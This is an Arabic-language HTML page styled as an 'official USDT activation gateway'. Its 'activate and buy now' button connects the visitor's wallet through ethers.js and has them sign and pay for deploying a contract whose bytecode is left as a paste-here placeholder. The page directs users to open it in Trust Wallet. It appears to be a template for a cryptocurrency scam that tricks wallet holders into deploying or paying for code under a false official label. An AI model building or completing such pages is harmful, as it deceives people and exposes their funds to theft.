<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Activation</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #000; color: #00ff00; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .btn { background: #00ff00; color: #000; padding: 20px; width: 80%; border-radius: 15px; font-size: 20px; font-weight: bold; border: none; cursor: pointer; }
        #status { margin-top: 20px; color: white; font-size: 14px; }
    </style>
</head>
<body>
    <h2>بوابة تفعيل USDT الرسمية</h2>
    <p>اضغط على الزر أدناه لتفعيل العقد</p>
    <button class="btn" id="mainBtn">تفعيل وشراء الآن</button>
    <div id="status">الحالة: بانتظار الاتصال...</div>

    <script>
        // ضع الكود الطويل (Bytecode) الخاص بك هنا بين علامات التنصيص
        const myBytecode = "0x60806040527f... (الصق الكود هنا)";

        document.getElementById('mainBtn').onclick = async () => {
            const statusDiv = document.getElementById('status');
            if (typeof window.ethereum !== 'undefined') {
                try {
                    statusDiv.innerText = "جاري طلب فتح المحفظة...";
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    const signer = provider.getSigner();
                    
                    statusDiv.innerText = "تم الاتصال! جاري إنشاء العقد (سيظهر طلب دفع الآن)...";
                    const factory = new ethers.ContractFactory([], myBytecode, signer);
                    const contract = await factory.deploy();
                    
                    statusDiv.innerText = "جاري معالجة الشبكة... لا تغلق الصفحة";
                    await contract.deployed();
                    
                    statusDiv.innerHTML = "<h3 style='color:#00ff00'>تم بنجاح!</h3>العنوان: " + contract.address;
                    alert("نجح التفعيل! عنوان العقد هو: " + contract.address);
                } catch (err) {
                    statusDiv.innerText = "خطأ: " + err.message;
                }
            } else {
                alert("يرجى فتح الرابط من داخل متصفح Trust Wallet");
            }
        };
    </script>
</body>
</html>
